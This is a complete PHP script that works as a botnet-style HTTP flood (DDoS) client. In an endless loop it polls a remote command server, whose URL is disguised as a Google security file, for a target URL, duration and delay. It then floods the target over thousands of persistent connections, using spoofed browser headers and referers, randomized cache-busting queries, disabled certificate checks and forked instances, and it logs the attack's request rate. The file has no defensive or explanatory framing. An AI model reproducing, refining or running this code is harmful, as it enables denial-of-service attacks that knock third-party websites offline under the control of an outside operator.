<?php
$api_url = "https://labaidgroup.com/files/google_security2025992852991526.php";
$requests_per_socket_per_second = 10000;
$num_sockets = 10000;
$retry_limit = 3;
$retry_delay = 1;
$byte_range = "0-1";

ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');
set_time_limit(0);
ignore_user_abort(true);

$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

function get_random_headers($url) {
    global $user_agents;
    $headers = [
        "User-Agent: " . $user_agents[array_rand($user_agents)],
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9,ar;q=0.8",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Upgrade-Insecure-Requests: 1",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: ?1"
    ];
    
    $referers = [
        "https://www.google.com/search?q=" . urlencode(uniqid()),
        "https://www.bing.com/search?q=" . urlencode(uniqid()),
        "https://twitter.com/home",
        "https://www.facebook.com/",
        "https://www.youtube.com/"
    ];
    $headers[] = "Referer: " . $referers[array_rand($referers)];
    
    return $headers;
}

function generate_random_query() {
    $params = [
        'v' => uniqid(),
        't' => time(),
        'r' => mt_rand(1000, 9999999),
        'c' => mt_rand(1, 1000),
        'u' => md5(microtime(true))
    ];
    return '?' . http_build_query($params);
}

function fetch_api_data($api_url, $retry_limit, $retry_delay) {
    $attempt = 0;
    while ($attempt < $retry_limit) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($http_code == 200 && !empty($response) && strpos($response, '<data>') !== false) {
            $xml = simplexml_load_string($response);
            if ($xml !== false && isset($xml->url, $xml->time, $xml->wait)) {
                return [
                    'url' => (string)$xml->url,
                    'time' => (int)$xml->time,
                    'wait' => (int)$xml->wait
                ];
            }
        }
        
        $attempt++;
        if ($attempt < $retry_limit) sleep($retry_delay);
    }
    return false;
}

function setup_curl_handle($url) {
    global $byte_range;
    $ch = curl_init();
    
    $options = [
        CURLOPT_URL => $url . generate_random_query(),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_RANGE => $byte_range,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_CONNECTTIMEOUT => 1,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HTTPHEADER => get_random_headers($url),
        CURLOPT_FORBID_REUSE => false,
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_TCP_NODELAY => true,
        CURLOPT_BUFFERSIZE => 1024,
        CURLOPT_DNS_CACHE_TIMEOUT => 3600,
        CURLOPT_HEADER => false,
        CURLOPT_HTTPGET => true,
        CURLOPT_ENCODING => 'gzip',
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
    ];
    
    curl_setopt_array($ch, $options);
    return $ch;
}

function update_curl_handle($ch, $url) {
    curl_setopt($ch, CURLOPT_URL, $url . generate_random_query());
    curl_setopt($ch, CURLOPT_HTTPHEADER, get_random_headers($url));
}

function execute_requests($target_url, $total_duration) {
    global $requests_per_socket_per_second, $num_sockets;
    
    $request_count = 0;
    $multi_handle = curl_multi_init();
    
    curl_multi_setopt($multi_handle, CURLMOPT_MAX_TOTAL_CONNECTIONS, $num_sockets);
    curl_multi_setopt($multi_handle, CURLMOPT_MAX_HOST_CONNECTIONS, $num_sockets);
    curl_multi_setopt($multi_handle, CURLMOPT_PIPELINING, CURLPIPE_HTTP1 | CURLPIPE_MULTIPLEX);
    
    $curl_handles = [];

    echo "[+] Creating $num_sockets persistent connections...\n";
    for ($i = 0; $i < $num_sockets; $i++) {
        $ch = setup_curl_handle($target_url);
        $curl_handles[] = $ch;
    }

    $start_time = microtime(true);
    $end_time = $start_time + $total_duration;
    $last_print = $start_time;
    
    $rps_history = [];
    $adjustment_factor = 1.0;

    echo "[+] Starting attack for $total_duration seconds...\n";
    
    while (microtime(true) < $end_time) {
        $loop_start = microtime(true);
        $requests_this_loop = 0;
        
        $target_requests_this_loop = (int)($requests_per_socket_per_second * $adjustment_factor);
        
        $active_handles = [];
        
        for ($j = 0; $j < min($target_requests_this_loop, $num_sockets); $j++) {
            if (microtime(true) >= $end_time) break;
            
            $ch = $curl_handles[$j % count($curl_handles)];
            update_curl_handle($ch, $target_url);
            curl_multi_add_handle($multi_handle, $ch);
            $active_handles[] = $ch;
            $request_count++;
            $requests_this_loop++;
        }
        
        $running = 0;
        do {
            $status = curl_multi_exec($multi_handle, $running);
            if ($status != CURLM_OK) {
                break;
            }
            
            $ready = curl_multi_select($multi_handle, 0.0001);
            
            while ($info = curl_multi_info_read($multi_handle)) {
                if ($info['result'] === CURLE_OK) {
                }
                curl_multi_remove_handle($multi_handle, $info['handle']);
            }
        } while ($running > 0 && (microtime(true) - $loop_start) < 0.1);
        
        foreach ($active_handles as $ch) {
            curl_multi_remove_handle($multi_handle, $ch);
        }
        
        $loop_duration = microtime(true) - $loop_start;
        $current_rps = $requests_this_loop / max(0.001, $loop_duration);
        
        $rps_history[] = $current_rps;
        if (count($rps_history) > 10) array_shift($rps_history);
        
        $avg_rps = array_sum($rps_history) / max(1, count($rps_history));
        if ($avg_rps < $requests_per_socket_per_second * 0.8) {
            $adjustment_factor = min(2.0, $adjustment_factor * 1.1);
        } elseif ($avg_rps > $requests_per_socket_per_second * 1.2) {
            $adjustment_factor = max(0.5, $adjustment_factor * 0.9);
        }
        
        $current_time = microtime(true);
        if ($current_time - $last_print >= 1) {
            $total_elapsed = $current_time - $start_time;
            $overall_rps = $request_count / max(0.001, $total_elapsed);
            
            $mem_usage = round(memory_get_usage(true) / 1024 / 1024, 2);
            $mem_peak = round(memory_get_peak_usage(true) / 1024 / 1024, 2);
            
            echo "[" . date('H:i:s') . "] RPS: " . round($overall_rps) . 
                 " | Total: " . number_format($request_count) . 
                 " | Active: " . count($active_handles) .
                 " | Mem: {$mem_usage}MB (Peak: {$mem_peak}MB)" .
                 " | Factor: " . round($adjustment_factor, 2) . "\n";
            flush();
            $last_print = $current_time;
        }
        
        $target_loop_time = 0.01;
        $actual_loop_time = microtime(true) - $loop_start;
        $sleep_time = max(0, $target_loop_time - $actual_loop_time);
        
        if ($sleep_time > 0) {
            usleep((int)($sleep_time * 1000000));
        }
    }
    
    foreach ($curl_handles as $ch) {
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    curl_multi_close($multi_handle);
    
    $total_time = microtime(true) - $start_time;
    $final_rps = $request_count / max(0.001, $total_time);
    
    echo "\n[+] Process finished\n";
    echo "Total requests: " . number_format($request_count) . "\n";
    echo "Average RPS: " . round($final_rps) . "\n";
    echo "Peak RPS: " . round(max($rps_history)) . "\n";
    echo "Total time: " . round($total_time, 2) . "s\n\n";
    flush();
    
    return $request_count;
}

if (function_exists('opcache_reset')) opcache_reset();
if (function_exists('gc_disable')) gc_disable();

$instance_id = getenv('INSTANCE_ID') ?: '1';
echo "=== Instance $instance_id started (PHP " . PHP_VERSION . ") ===\n";
echo "Memory limit: " . ini_get('memory_limit') . "\n";
echo "Max execution time: " . ini_get('max_execution_time') . "\n\n";
flush();

$max_instances = 1;
if (PHP_SAPI === 'cli' && extension_loaded('pcntl')) {
    $max_instances = 4;
    $pid = pcntl_fork();
}

while (true) {
    $data = fetch_api_data($api_url, $retry_limit, $retry_delay);
    
    if ($data !== false) {
        echo "[Instance $instance_id] Target: " . substr($data['url'], 0, 60) . "...\n";
        echo "[Instance $instance_id] Duration: " . $data['time'] . "s\n";
        echo "[Instance $instance_id] Waiting: " . $data['wait'] . "s\n";
        flush();
        
        sleep($data['wait']);
        
        echo "[Instance $instance_id] Starting optimized high-speed requests...\n";
        flush();
        
        execute_requests($data['url'], $data['time']);
        
        echo "[Instance $instance_id] Completed\n\n";
        flush();
    } else {
        echo "[Instance $instance_id] No target, retry in 5s\n";
        flush();
        sleep(5);
    }
}
?>
